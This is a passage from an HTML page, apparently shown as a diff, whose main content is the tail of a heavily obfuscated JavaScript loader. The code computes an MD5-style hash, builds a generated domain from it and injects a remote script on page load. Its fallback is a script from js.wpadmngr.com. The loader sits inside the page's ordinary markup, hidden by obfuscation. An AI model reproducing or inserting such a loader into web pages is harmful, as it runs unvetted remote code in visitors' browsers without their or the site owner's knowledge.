X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
